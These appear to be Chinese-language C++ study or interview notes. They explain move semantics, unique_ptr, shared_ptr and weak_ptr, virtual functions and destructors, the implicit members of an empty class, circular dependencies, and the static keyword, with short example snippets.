C++98\u6807\u51c6\u5e93\u4e2d\u63d0\u4f9b\u4e86\u4e00\u79cd\u552f\u4e00\u62e5\u6709\u6027\u7684\u667a\u80fd\u6307\u9488std::auto_ptr\uff0c\u8be5\u7c7b\u578b\u5728C++11\u4e2d\u5df2\u88ab\u5e9f\u5f03\uff0c\u56e0\u4e3a\u5176\u201c\u590d\u5236\u201d\u884c\u4e3a\u662f\u5371\u9669\u7684\u3002C++ 11\u4e2d\uff0cstd::auto_ptr< T >\u5df2\u7ecf\u88abstd::unique_ptr< T >\u6240\u53d6\u4ee3\uff0c\u540e\u8005\u5c31\u662f\u5229\u7528\u7684\u53f3\u503c\u5f15\u7528\u3002\u5176\u8f6c\u79fb\u6784\u9020\u51fd\u6570\uff1a unique_ptr(unique_ptr&& source) // note the rvalue reference { ptr = source.ptr; source.ptr = nullptr; } \u8fd9\u4e2a\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u8ddfauto_ptr\u4e2d\u590d\u5236\u6784\u9020\u51fd\u6570\u505a\u7684\u4e8b\u60c5\u4e00\u6837\uff0c\u4f46\u662f\u5b83\u5374\u53ea\u80fd\u63a5\u53d7\u53f3\u503c\u4f5c\u4e3a\u53c2\u6570\u3002 unique_ptr<Shape> a(new Triangle); unique_ptr<Shape> b(a); // error unique_ptr<Shape> c(make_triangle()); // okay \u7b2c\u4e8c\u884c\u4e0d\u80fd\u7f16\u8bd1\u901a\u8fc7\uff0c\u56e0\u4e3aa\u662f\u5de6\u503c\uff0c\u4f46\u662f\u53c2\u6570unique_ptr&& source\u53ea\u80fd\u63a5\u53d7\u53f3\u503c\uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u6240\u9700\u8981\u7684\uff0c\u675c\u7edd\u5371\u9669\u7684\u9690\u5f0f\u8f6c\u79fb\u3002\u7b2c\u4e09\u884c\u7f16\u8bd1\u6ca1\u6709\u95ee\u9898\uff0c\u56e0\u4e3amake_triangle()\u662f\u53f3\u503c\uff0c\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u4f1a\u5c06\u4e34\u65f6\u5bf9\u8c61\u7684\u6240\u6709\u6743\u8f6c\u79fb\u7ed9\u5bf9\u8c61c\uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u9700\u8981\u7684\u3002 C++ 11\u5728\u6807\u51c6\u5e93\u7684\u5934\u6587\u4ef6< utility >\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6a21\u677f\u51fd\u6570std::move\u3002\u5b9e\u9645\u4e0a\uff0cstd::move\u4ec5\u4ec5\u662f\u7b80\u5355\u5730\u5c06\u5de6\u503c\u8f6c\u6362\u4e3a\u53f3\u503c\uff0c\u5b83\u672c\u8eab\u5e76\u6ca1\u6709\u8f6c\u79fb\u4efb\u4f55\u4e1c\u897f\u3002\u5b83\u4ec5\u4ec5\u662f\u8ba9\u5bf9\u8c61\u53ef\u4ee5\u8f6c\u79fb\u3002\u4ee5\u4e0b\u662f\u5982\u4f55\u6b63\u786e\u7684\u8f6c\u79fb\u5de6\u503c\uff1a unique_ptr<Shape> a(new Triangle); unique_ptr<Shape> b(a); // still an error unique_ptr<Shape> c(std::move(a)); // okay \u8bf7\u6ce8\u610f\uff0c\u7b2c\u4e09\u884c\u4e4b\u540e\uff0ca\u4e0d\u518d\u62e5\u6709Triangle\u5bf9\u8c61\u3002\u4e0d\u8fc7\u8fd9\u6ca1\u6709\u5173\u7cfb\uff0c\u56e0\u4e3a\u901a\u8fc7\u660e\u786e\u7684\u5199\u51fastd::move(a)\uff0c\u6211\u4eec\u5f88\u6e05\u695a\u6211\u4eec\u7684\u610f\u56fe\uff1a\u4eb2\u7231\u7684\u8f6c\u79fb\u6784\u9020\u51fd\u6570\uff0c\u4f60\u53ef\u4ee5\u5bf9a\u505a\u4efb\u4f55\u60f3\u8981\u505a\u7684\u4e8b\u60c5\u6765\u521d\u59cb\u5316c\uff1b\u6211\u4e0d\u518d\u9700\u8981a\u4e86\uff0c\u5bf9\u4e8ea\uff0c\u60a8\u8bf7\u81ea\u4fbf\u3002 \u5f53\u7136\uff0c\u5982\u679c\u4f60\u5728\u4f7f\u7528\u4e86mova(a)\u4e4b\u540e\uff0c\u8fd8\u7ee7\u7eed\u4f7f\u7528a\uff0c\u90a3\u65e0\u7591\u662f\u642c\u8d77\u77f3\u5934\u7838\u81ea\u5df1\u7684\u811a\uff0c\u8fd8\u662f\u4f1a\u5bfc\u81f4\u4e25\u91cd\u7684\u8fd0\u884c\u9519\u8bef\u3002 \u603b\u4e4b\uff0cstd::move(some_lvalue)\u5c06\u5de6\u503c\u8f6c\u6362\u4e3a\u53f3\u503c\uff08\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u79cd\u7c7b\u578b\u8f6c\u6362\uff09\uff0c\u4f7f\u63a5\u4e0b\u6765\u7684\u8f6c\u79fb\u6210\u4e3a\u53ef\u80fd\u3002 \u667a\u80fd\u6307\u9488 C++\u91cc\u9762\u7684\u56db\u4e2a\u667a\u80fd\u6307\u9488: auto_ptr, unique_ptr,shared_ptr, weak_ptr \u5176\u4e2d\u540e\u4e09\u4e2a\u662fC++11\u652f\u6301\uff0c\u5e76\u4e14\u7b2c\u4e00\u4e2a\u5df2\u7ecf\u88abC++11\u5f03\u7528\u3002 unique_ptr\u5b9e\u73b0\u72ec\u5360\u5f0f\u62e5\u6709\u6216\u4e25\u683c\u62e5\u6709\u6982\u5ff5\uff0c\u4fdd\u8bc1\u540c\u4e00\u65f6\u95f4\u5185\u53ea\u6709\u4e00\u4e2a\u667a\u80fd\u6307\u9488\u53ef\u4ee5\u6307\u5411\u8be5\u5bf9\u8c61\u3002\u5b83\u5bf9\u4e8e\u907f\u514d\u8d44\u6e90\u6cc4\u9732(\u4f8b\u5982\u201c\u4ee5new\u521b\u5efa\u5bf9\u8c61\u540e\u56e0\u4e3a\u53d1\u751f\u5f02\u5e38\u800c\u5fd8\u8bb0\u8c03\u7528delete\u201d)\u7279\u522b\u6709\u7528\u3002 shared_ptr\u5b9e\u73b0\u5171\u4eab\u5f0f\u62e5\u6709\u6982\u5ff5\u3002\u591a\u4e2a\u667a\u80fd\u6307\u9488\u53ef\u4ee5\u6307\u5411\u76f8\u540c\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u548c\u5176\u76f8\u5173\u8d44\u6e90\u4f1a\u5728\u201c\u6700\u540e\u4e00\u4e2a\u5f15\u7528\u88ab\u9500\u6bc1\u201d\u65f6\u5019\u91ca\u653e\u3002\u4ece\u540d\u5b57share\u5c31\u53ef\u4ee5\u770b\u51fa\u4e86\u8d44\u6e90\u53ef\u4ee5\u88ab\u591a\u4e2a\u6307\u9488\u5171\u4eab\uff0c\u5b83\u4f7f\u7528\u8ba1\u6570\u673a\u5236\u6765\u8868\u660e\u8d44\u6e90\u88ab\u51e0\u4e2a\u6307\u9488\u5171\u4eab\u3002\u53ef\u4ee5\u901a\u8fc7\u6210\u5458\u51fd\u6570use_count()\u6765\u67e5\u770b\u8d44\u6e90\u7684\u6240\u6709\u8005\u4e2a\u6570\u3002\u9664\u4e86\u53ef\u4ee5\u901a\u8fc7new\u6765\u6784\u9020\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u4f20\u5165auto_ptr, unique_ptr,weak_ptr\u6765\u6784\u9020\u3002\u5f53\u6211\u4eec\u8c03\u7528release()\u65f6\uff0c\u5f53\u524d\u6307\u9488\u4f1a\u91ca\u653e\u8d44\u6e90\u6240\u6709\u6743\uff0c\u8ba1\u6570\u51cf\u4e00\u3002\u5f53\u8ba1\u6570\u7b49\u4e8e0\u65f6\uff0c\u8d44\u6e90\u4f1a\u88ab\u91ca\u653e\u3002 shared_ptr \u662f\u4e3a\u4e86\u89e3\u51b3 auto_ptr \u5728\u5bf9\u8c61\u6240\u6709\u6743\u4e0a\u7684\u5c40\u9650\u6027(auto_ptr \u662f\u72ec\u5360\u7684), \u5728\u4f7f\u7528\u5f15\u7528\u8ba1\u6570\u7684\u673a\u5236\u4e0a\u63d0\u4f9b\u4e86\u53ef\u4ee5\u5171\u4eab\u6240\u6709\u6743\u7684\u667a\u80fd\u6307\u9488\u3002 \u6210\u5458\u51fd\u6570\uff1a use_count \u8fd4\u56de\u5f15\u7528\u8ba1\u6570\u7684\u4e2a\u6570 unique \u8fd4\u56de\u662f\u5426\u662f\u72ec\u5360\u6240\u6709\u6743( use_count \u4e3a 1) swap \u4ea4\u6362\u4e24\u4e2a shared_ptr \u5bf9\u8c61(\u5373\u4ea4\u6362\u6240\u62e5\u6709\u7684\u5bf9\u8c61) reset \u653e\u5f03\u5185\u90e8\u5bf9\u8c61\u7684\u6240\u6709\u6743\u6216\u62e5\u6709\u5bf9\u8c61\u7684\u53d8\u66f4, \u4f1a\u5f15\u8d77\u539f\u6709\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\u7684\u51cf\u5c11 get \u8fd4\u56de\u5185\u90e8\u5bf9\u8c61(\u6307\u9488), \u7531\u4e8e\u5df2\u7ecf\u91cd\u8f7d\u4e86()\u65b9\u6cd5, \u56e0\u6b64\u548c\u76f4\u63a5\u4f7f\u7528\u5bf9\u8c61\u662f\u4e00\u6837\u7684 share_ptr\u867d\u7136\u5df2\u7ecf\u5f88\u597d\u7528\u4e86\uff0c\u4f46\u662f\u6709\u4e00\u70b9share_ptr\u667a\u80fd\u6307\u9488\u8fd8\u662f\u6709\u5185\u5b58\u6cc4\u9732\u7684\u60c5\u51b5\uff0c\u5f53\u4e24\u4e2a\u5bf9\u8c61\u76f8\u4e92\u4f7f\u7528\u4e00\u4e2ashared_ptr\u6210\u5458\u53d8\u91cf\u6307\u5411\u5bf9\u65b9\uff0c\u4f1a\u9020\u6210\u5faa\u73af\u5f15\u7528\uff0c\u4f7f\u5f15\u7528\u8ba1\u6570\u5931\u6548\uff0c\u4ece\u800c\u5bfc\u81f4\u5185\u5b58\u6cc4\u6f0f\u3002 weak_ptr \u662f\u4e00\u79cd\u4e0d\u63a7\u5236\u5bf9\u8c61\u751f\u547d\u5468\u671f\u7684\u667a\u80fd\u6307\u9488, \u5b83\u6307\u5411\u4e00\u4e2a shared_ptr \u7ba1\u7406\u7684\u5bf9\u8c61. \u8fdb\u884c\u8be5\u5bf9\u8c61\u7684\u5185\u5b58\u7ba1\u7406\u7684\u662f\u90a3\u4e2a\u5f3a\u5f15\u7528\u7684shared_ptr\uff0c weak_ptr\u53ea\u662f\u63d0\u4f9b\u4e86\u5bf9\u7ba1\u7406\u5bf9\u8c61\u7684\u4e00\u4e2a\u8bbf\u95ee\u624b\u6bb5\u3002weak_ptr \u8bbe\u8ba1\u7684\u76ee\u7684\u662f\u4e3a\u914d\u5408 shared_ptr \u800c\u5f15\u5165\u7684\u4e00\u79cd\u667a\u80fd\u6307\u9488\u6765\u534f\u52a9 shared_ptr \u5de5\u4f5c, \u5b83\u53ea\u53ef\u4ee5\u4ece\u4e00\u4e2a shared_ptr \u6216\u53e6\u4e00\u4e2a weak_ptr \u5bf9\u8c61\u6784\u9020, \u5b83\u7684\u6784\u9020\u548c\u6790\u6784\u4e0d\u4f1a\u5f15\u8d77\u5f15\u7528\u8bb0\u6570\u7684\u589e\u52a0\u6216\u51cf\u5c11\u3002weak_ptr\u662f\u7528\u6765\u89e3\u51b3shared_ptr\u76f8\u4e92\u5f15\u7528\u65f6\u7684\u6b7b\u9501\u95ee\u9898,\u5982\u679c\u8bf4\u4e24\u4e2ashared_ptr\u76f8\u4e92\u5f15\u7528,\u90a3\u4e48\u8fd9\u4e24\u4e2a\u6307\u9488\u7684\u5f15\u7528\u8ba1\u6570\u6c38\u8fdc\u4e0d\u53ef\u80fd\u4e0b\u964d\u4e3a0,\u8d44\u6e90\u6c38\u8fdc\u4e0d\u4f1a\u91ca\u653e\u3002\u5b83\u662f\u5bf9\u5bf9\u8c61\u7684\u4e00\u79cd\u5f31\u5f15\u7528\uff0c\u4e0d\u4f1a\u589e\u52a0\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\uff0c\u548cshared_ptr\u4e4b\u95f4\u53ef\u4ee5\u76f8\u4e92\u8f6c\u5316\uff0cshared_ptr\u53ef\u4ee5\u76f4\u63a5\u8d4b\u503c\u7ed9\u5b83\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528lock\u51fd\u6570\u6765\u83b7\u5f97shared_ptr\u3002 weak_ptr \u6ca1\u6709\u91cd\u8f7d*\u548c->\u4f46\u53ef\u4ee5\u4f7f\u7528 lock \u83b7\u5f97\u4e00\u4e2a\u53ef\u7528\u7684 shared_ptr \u5bf9\u8c61. \u6ce8\u610f, weak_ptr \u5728\u4f7f\u7528\u524d\u9700\u8981\u68c0\u67e5\u5408\u6cd5\u6027. expired \u7528\u4e8e\u68c0\u6d4b\u6240\u7ba1\u7406\u7684\u5bf9\u8c61\u662f\u5426\u5df2\u7ecf\u91ca\u653e, \u5982\u679c\u5df2\u7ecf\u91ca\u653e, \u8fd4\u56de true; \u5426\u5219\u8fd4\u56de false. lock \u7528\u4e8e\u83b7\u53d6\u6240\u7ba1\u7406\u7684\u5bf9\u8c61\u7684\u5f3a\u5f15\u7528(shared_ptr). \u5982\u679c expired \u4e3a true, \u8fd4\u56de\u4e00\u4e2a\u7a7a\u7684 shared_ptr; \u5426\u5219\u8fd4\u56de\u4e00\u4e2a shared_ptr, \u5176\u5185\u90e8\u5bf9\u8c61\u6307\u5411\u4e0e weak_ptr \u76f8\u540c. use_count \u8fd4\u56de\u4e0e shared_ptr \u5171\u4eab\u7684\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570. reset \u5c06 weak_ptr \u7f6e\u7a7a. weak_ptr \u652f\u6301\u62f7\u8d1d\u6216\u8d4b\u503c, \u4f46\u4e0d\u4f1a\u5f71\u54cd\u5bf9\u5e94\u7684 shared_ptr \u5185\u90e8\u5bf9\u8c61\u7684\u8ba1\u6570. C++ 20 \u65b0\u7279\u6027 \uf0c1 C++ \u7684\u4e09\u5927\u7279\u6027 \uf0c1 C++\u7684\u4e09\u5927\u7279\u6027\u4e3a\uff1a\u5c01\u88c5\u3001\u7ee7\u627f\u548c\u591a\u6001\u3002 \u5c01\u88c5\u6027\uff1a\u628a\u5ba2\u89c2\u4e8b\u7269\u5c01\u88c5\u6210\u62bd\u8c61\u7684\u7c7b\uff0c\u5e76\u4e14\u7c7b\u53ef\u4ee5\u628a\u81ea\u5df1\u7684\u6570\u636e\u548c\u65b9\u6cd5\u53ea\u8ba9\u53ef\u4fe1\u7684\u7c7b\u6216\u8005\u5bf9\u8c61\u64cd\u4f5c\uff0c\u5bf9\u4e0d\u53ef\u4fe1\u7684\u8fdb\u884c\u4fe1\u606f\u9690\u85cf\u3002 \u7c7b\u5c06\u6210\u5458\u53d8\u91cf\u548c\u6210\u5458\u51fd\u6570\u5c01\u88c5\u5728\u7c7b\u7684\u5185\u90e8\uff0c\u6839\u636e\u9700\u8981\u8bbe\u7f6e\u8bbf\u95ee\u6743\u9650\uff0c\u901a\u8fc7\u6210\u5458\u51fd\u6570\u7ba1\u7406\u5185\u90e8\u72b6\u6001\u3002 \u7ee7\u627f\uff1a\u987e\u540d\u601d\u4e49\uff0c\u5c31\u50cf\u5b69\u5b50\u4f1a\u7ee7\u627f\u7236\u6bcd\u7684\u4e00\u4e9b\u6027\u683c\u6216\u7279\u70b9\uff0c\u4e24\u4e2a\u7c7b\u5982\u679c\u5b58\u5728\u7ee7\u627f\u5173\u7cfb\uff0c\u5176\u5b50\u7c7b\u5fc5\u5b9a\u5177\u6709\u7236\u7c7b\u7684\u76f8\u5173\u5c5e\u6027\uff08\u5373\u53d8\u91cf\uff09\u548c\u65b9\u6cd5\uff08\u5373\u51fd\u6570\uff09\u3002\u7ee7\u627f\u7684\u4f5c\u7528\uff1a\u907f\u514d\u516c\u7528\u4ee3\u7801\u7684\u91cd\u590d\u5f00\u53d1\uff0c\u51cf\u5c11\u4ee3\u7801\u548c\u6570\u636e\u5197\u4f59\u3002 \u591a\u6001\uff1aC++\u4e2d\u6709\u4e24\u79cd\u591a\u6001\uff0c\u79f0\u4e3a \u52a8\u591a\u6001\uff08\u8fd0\u884c\u671f\u591a\u6001\uff09 \u548c \u9759\u591a\u6001\uff08\u7f16\u8bd1\u671f\u591a\u6001\uff09 \uff0c\u800c \u9759\u591a\u6001\u4e3b\u8981\u901a\u8fc7\u6a21\u677f\u6765\u5b9e\u73b0\uff0c\u5b8f\u4e5f\u662f\u5b9e\u73b0\u9759\u591a\u6001\u7684\u4e00\u79cd\u9014\u5f84 \u3002 \u52a8\u591a\u6001\u5728C++\u4e2d\u662f\u901a\u8fc7\u865a\u51fd\u6570\u5b9e\u73b0\u7684 \uff0c\u5373\u5728\u57fa\u7c7b\u4e2d\u5b58\u5728\u4e00\u4e9b\u63a5\u53e3\uff08\u4e00\u822c\u4e3a\u7eaf\u865a\u51fd\u6570\uff09\uff0c\u5b50\u7c7b\u5fc5\u987b\u91cd\u8f7d\u8fd9\u4e9b\u63a5\u53e3\u3002\u8fd9\u6837\u901a\u8fc7\u4f7f\u7528\u57fa\u7c7b\u7684\u6307\u9488\u6216\u8005\u5f15\u7528\u6307\u5411\u5b50\u7c7b\u7684\u5bf9\u8c61\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u8c03\u7528\u5b50\u7c7b\u5bf9\u5e94\u7684\u51fd\u6570\u7684\u529f\u80fd\u3002\u52a8\u591a\u6001\u7684\u51fd\u6570\u8c03\u7528\u673a\u5236\u662f\u6267\u884c\u671f\u624d\u80fd\u8fdb\u884c\u786e\u5b9a\uff0c\u6240\u4ee5\u5b83\u662f\u52a8\u6001\u7684\u3002 C++\u7684\u591a\u6001\u5b9e\u73b0\u539f\u7406 \uf0c1 C++\u7684\u591a\u6001\u6027\u662f\u901a\u8fc7\u8fdf\u7ed1\u5b9a\u6280\u672f\u6765\u5b9e\u73b0\u7684\u3002 C++\u7684\u591a\u6001\u6027\u7528\u4e00\u53e5\u8bdd\u6982\u62ec\u5c31\u662f\uff1a\u5728\u57fa\u7c7b\u7684\u51fd\u6570\u524d\u52a0\u4e0avirtual\u5173\u952e\u5b57\uff0c\u5728\u6d3e\u751f\u7c7b\u4e2d\u91cd\u5199\u8be5\u51fd\u6570\uff0c\u8fd0\u884c\u65f6\u5c06\u4f1a\u6839\u636e\u5bf9\u8c61\u7684\u5b9e\u9645\u7c7b\u578b\u6765\u8c03\u7528\u76f8\u5e94\u7684\u51fd\u6570\u3002\u5982\u679c\u5bf9\u8c61\u7c7b\u578b\u662f\u6d3e\u751f\u7c7b\uff0c\u5c31\u8c03\u7528\u6d3e\u751f\u7c7b\u7684\u51fd\u6570\uff1b\u5982\u679c\u5bf9\u8c61\u7c7b\u578b\u662f\u57fa\u7c7b\uff0c\u5c31\u8c03\u7528\u57fa\u7c7b\u7684\u51fd\u6570\u3002 \u4ec0\u4e48\u662f\u865a\u51fd\u6570 \uf0c1 \u4ec0\u4e48\u662f\u7eaf\u865a\u51fd\u6570 \uf0c1 \u865a\u8868\u6307\u9488\u7684\u5927\u5c0f \uf0c1 \u865a\u51fd\u6570\u8868\u7684\u5b58\u653e\u5185\u5bb9 \uf0c1 \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u662f\u865a\u51fd\u6570\u5417 \uf0c1 \u6784\u9020\u51fd\u6570\u4e0d\u9700\u8981\u662f\u865a\u51fd\u6570\uff0c\u4e5f\u4e0d\u5141\u8bb8\u662f\u865a\u51fd\u6570\u3002 \u865a\u51fd\u6570\u7684\u8c03\u7528\u9700\u8981 vptr \u6307\u9488\uff0c\u800c\u8be5\u6307\u9488\u5b58\u653e\u5728\u5bf9\u8c61\u7684\u5185\u5bb9\u7a7a\u95f4\u4e2d\uff0c\u9700\u8981\u8c03\u7528\u6784\u9020\u51fd\u6570\u624d\u53ef\u4ee5\u521b\u5efa\u5b83\u7684\u503c\uff0c\u5426\u5219\u5373\u4f7f\u5f00\u8f9f\u4e86\u7a7a\u95f4\uff0c\u8be5 vptr \u6307\u9488\u4e3a\u968f\u673a\u503c\uff1b\u82e5\u6784\u9020\u51fd\u6570\u58f0\u660e\u4e3a\u865a\u51fd\u6570\uff0c\u90a3\u4e48\u7531\u4e8e\u5bf9\u8c61\u8fd8\u672a\u521b\u5efa\uff0c\u8fd8\u6ca1\u6709\u5185\u5b58\u7a7a\u95f4\uff0c\u66f4\u6ca1\u6709 vptr \u5730\u5740\u7528\u6765\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u4e00\u7684\u6784\u9020\u51fd\u6570\u4e86\u3002 \u6790\u6784\u51fd\u6570\u53ef\u4ee5\u662f\u865a\u51fd\u6570\u5417 \uf0c1 \u9996\u5148\u6790\u6784\u51fd\u6570\u53ef\u4ee5\u4e3a\u865a\u51fd\u6570\uff0c\u800c\u4e14\u5f53\u8981\u4f7f\u7528\u57fa\u7c7b\u6307\u9488\u6216\u5f15\u7528\u8c03\u7528\u5b50\u7c7b\u65f6\uff0c\u6700\u597d\u5c06\u57fa\u7c7b\u7684\u6790\u6784\u51fd\u6570\u58f0\u660e\u4e3a\u865a\u51fd\u6570\uff0c\u5426\u5219\u53ef\u4ee5\u5b58\u5728\u5185\u5b58\u6cc4\u9732\u7684\u95ee\u9898\u3002 \u4e3e\u4f8b\u8bf4\u660e\uff1a\u5047\u8bbe\u5b50\u7c7bB\u7ee7\u627f\u81ea\u57fa\u7c7bA\uff1b A *p = new B; delete p; \u6b64\u65f6\uff0c\u5982\u679c\u7c7bA\u7684\u6790\u6784\u51fd\u6570\u4e0d\u662f\u865a\u51fd\u6570\uff0c\u90a3\u4e48delete p\uff1b\u5c06\u4f1a\u4ec5\u4ec5\u8c03\u7528A\u7684\u6790\u6784\u51fd\u6570\uff0c\u53ea\u91ca\u653e\u4e86B\u5bf9\u8c61\u4e2d\u7684A\u90e8\u5206\uff0c\u800c\u6d3e\u751f\u51fa\u7684\u65b0\u7684\u90e8\u5206\u672a\u91ca\u653e\u6389\u3002 \u5982\u679c\u7c7bA\u7684\u6790\u6784\u51fd\u6570\u662f\u865a\u51fd\u6570\uff0cdelete p; \u5c06\u4f1a\u5148\u8c03\u7528B\u7684\u6790\u6784\u51fd\u6570\uff0c\u518d\u8c03\u7528A\u7684\u6790\u6784\u51fd\u6570\uff0c\u91ca\u653eB\u5bf9\u8c61\u7684\u6240\u6709\u7a7a\u95f4\u3002 \u8865\u5145\uff1a B *p = new B; delete p;\u65f6\u4e5f\u662f\u5148\u8c03\u7528B\u7684\u6790\u6784\u51fd\u6570\uff0c\u518d\u8c03\u7528A\u7684\u6790\u6784\u51fd\u6570\u3002 \u4e00\u4e2a\u7a7a\u7c7b\u4f1a\u751f\u6210\u54ea\u4e9b\u51fd\u6570 \uf0c1 \u5f53\u7a7a\u7c7bEmpty_one\u5b9a\u4e49\u4e00\u4e2a\u5bf9\u8c61\u65f6Empty_one pt;sizeof(pt)\u4ecd\u662f\u4e3a1\uff0c\u4f46\u7f16\u8bd1\u5668\u4f1a\u751f\u62104\u4e2a\u6210\u5458\u51fd\u6570\uff1a \u4e00\u4e2a\u7f3a\u7701\u7684\u6784\u9020\u51fd\u6570 \u4e00\u4e2a\u62f7\u8d1d\u6784\u9020\u51fd\u6570 \u4e00\u4e2a\u6790\u6784\u51fd\u6570 \u4e00\u4e2a\u8d4b\u503c\u8fd0\u7b97\u7b26\u3002 \u8fd9\u4e9b\u51fd\u6570\u53ea\u6709\u5728\u7b2c\u4e00\u6b21\u4f7f\u7528\u5b83\u4eec\u7684\u65f6\u5019\u624d\u4f1a\u751f\u6210\uff0c\u4ed6\u4eec\u90fd\u662finline\u5e76\u4e14public\u7684\u3002 class Empty { public: Empty(); //\u7f3a\u7701\u6784\u9020\u51fd\u6570 Empty(const Empty &rhs); //\u62f7\u8d1d\u6784\u9020\u51fd\u6570 ~Empty(); //\u6790\u6784\u51fd\u6570 Empty& operator=(const Empty &rhs); //\u8d4b\u503c\u8fd0\u7b97\u7b26 }; \u5de6\u503c\u548c\u53f3\u503c \uf0c1 \u4ec0\u4e48\u662f\u667a\u80fd\u6307\u9488\uff0c\u6709\u54ea\u51e0\u79cd\uff0c\u4f5c\u7528\uff0c\u5b9e\u73b0\u539f\u7406 \uf0c1 \u5982\u4f55\u907f\u514d\u5faa\u73af\u4f9d\u8d56 \uf0c1 \u82e5\u5b58\u5728\u4e24\u4e2a\u7c7bA\u3001B\u4f7f\u5f97A\u7c7b\u4e2d\u542b\u6709B\u7c7b\u7684\u5bf9\u8c61\u4e14B\u7c7b\u4e2d\u5305\u542bA\u7c7b\u7684\u5bf9\u8c61\uff0c\u5219\u79f0A\u3001B\u4e4b\u95f4\u5b58\u5728\u5faa\u73af\u4f9d\u8d56\u3002 class A { public: B b; }; class B { public: A a; }; \u82e5\u4e24\u4e2a\u7c7b\u4e4b\u95f4\u5b58\u5728\u5faa\u73af\u4f9d\u8d56\u5219\u5728\u7f16\u8bd1\u65f6\u4f1a\u62a5\u9519\uff0c\u539f\u56e0\u662f\u4e24\u4e2a\u7c7b\u4e2d\u5b58\u5728\u76f8\u4e92\u7684\u8c03\u7528\uff0c\u65e0\u6cd5\u4e3a\u4e24\u4e2a\u7c7b\u5206\u914d\u5177\u4f53\u7684\u7a7a\u95f4\u3002 \u4e0b\u9762\u7b80\u8ff0\u51e0\u4e2a\u89e3\u51b3\u5faa\u73af\u4f9d\u8d56\u7684\u65b9\u6cd5\u3002 \u4f7f\u7528\u6307\u9488\u4ee3\u66ff\u53d8\u91cf\u58f0\u660e\uff0c\u5982 class A { public: B *b; }; class B { public: A *a; }; \u8fd9\u6837\u5728\u7f16\u8bd1\u65f6\u5e76\u4e0d\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u6307\u9488\u7c7b\u578b\u5c31\u662f\u56db\u4e2a\u5b57\u8282\uff0c\u5728\u7f16\u8bd1\u65f6\u7f16\u8bd1\u5668\u77e5\u9053A\u3001B\u7c7b\u6240\u5360\u5185\u5b58\u7a7a\u95f4\u7684\u5927\u5c0f\uff0c\u6545\u5728\u7f16\u8bd1\u65f6\u4e0d\u4f1a\u62a5\u9519\u3002 \u65e2\u7136A\u3001B\u4e24\u4e2a\u7c7b\u76f8\u4e92\u5305\u542b\u8bf4\u660eA\u3001B\u4e24\u4e2a\u7c7b\u7684\u8026\u5408\u5ea6\u6bd4\u8f83\u9ad8\uff0c\u5219\u53ef\u4ee5\u5c06A\u3001B\u58f0\u660e\u4e3a\u4e00\u4e2a\u7c7b\uff0c\u7136\u540e\u4f7f\u7528\u6d3e\u751f\uff0c\u5c06A\u3001B\u58f0\u660e\u4e3a\u8be5\u7c7b\u7684\u5b50\u7c7b\uff0c\u4fee\u6539\u6240\u9700\u7684\u53d8\u91cf\u5373\u53ef\u3002 unique_ptr \u4e2d std::move() \u4f5c\u7528 \uf0c1 static \u5173\u952e\u5b57\u7684\u4f7f\u7528 \uf0c1 \u9650\u5236\u7b26\u53f7\u7684\u4f5c\u7528\u57df\u53ea\u5728\u672c\u7a0b\u5e8f\u6587\u4ef6 \u82e5\u53d8\u91cf\u6216\u51fd\u6570\uff08\u7edf\u79f0\u7b26\u53f7\uff09\u4f7f\u7528static\u4fee\u9970\uff0c\u5219\u53ea\u80fd\u5728\u672c\u7a0b\u5e8f\u6587\u4ef6\u5185\u4f7f\u7528\uff0c\u5176\u4ed6\u7a0b\u5e8f\u6587\u4ef6\u4e0d\u80fd\u8c03\u7528\uff08\u975estatic\u7684\u53ef\u4ee5\u901a\u8fc7extern \u5173\u952e\u5b57\u58f0\u660e\u8be5\u53d8\u91cf\u662f\u5728\u5176\u4ed6\u6587\u4ef6\u5185\u5b9a\u4e49\u7684\uff0c\u6b64\u6587\u4ef6\u53ef\u8c03\u7528\uff09\u3002\u4e0d\u52a0static\u4fee\u9970\u7684\uff0c\u5219\u9ed8\u8ba4\u662f\u53ef\u4ee5\u88ab\u5176\u4ed6\u7a0b\u5e8f\u6587\u4ef6\u8c03\u7528\u7684\u3002 \u6307\u5b9a\u53d8\u91cf\u7684\u5b58\u50a8\u4f4d\u7f6e \u5bf9\u4e8e\u51fd\u6570\u5185\u7684\u53d8\u91cf\u3002auto\u53d8\u91cf\uff08\u51fd\u6570\u5c40\u90e8\u53d8\u91cf\uff09\u90fd\u662f\u5728\u6808\u5185\u5b58\u533a\u5b58\u653e\uff0c\u51fd\u6570\u7ed3\u675f\u540e\u5c31\u81ea\u52a8\u91ca\u653e\u3002\u4f46\u662f\u5168\u5c40\u7684\u548c\u51fd\u6570\u5185\u5b9a\u4e49\u7684static\u53d8\u91cf\u90fd\u662f\u5b58\u653e\u5728\u6570\u636e\u533a\u7684\uff0c\u4e14\u53ea\u5b58\u4e00\u4efd\uff0c\u53ea\u5728\u6574\u4e2a\u7a0b\u5e8f\u7ed3\u675f\u540e\u624d\u81ea\u52a8\u91ca\u653e\u3002 \u7531\u4e8estatic\u53d8\u91cf\u53ea\u5b58\u4e00\u4efd\u5373\u540c\u4e00\u5730\u5740\uff0c\u6240\u4ee5\u4e0d\u7ba1\u51fd\u6570\u8c03\u7528\u591a\u5c11\u6b21\uff0c\u51fd\u6570\u5185\u5b9a\u4e49static\u53d8\u91cf\u7684\u8bed\u53e5\u53ea\u4f1a\u5728\u7b2c\u4e00\u6b21\u8c03\u7528\u65f6\u6267\u884c\uff0c\u540e\u9762\u8c03\u7528\u90fd\u4e0d\u6267\u884c\u4e5f\u4e0d\u518d\u521d\u59cb\u5316\uff0c\u800c\u662f\u5bf9\u8be5\u5730\u5740\u5185\u7684\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u3002 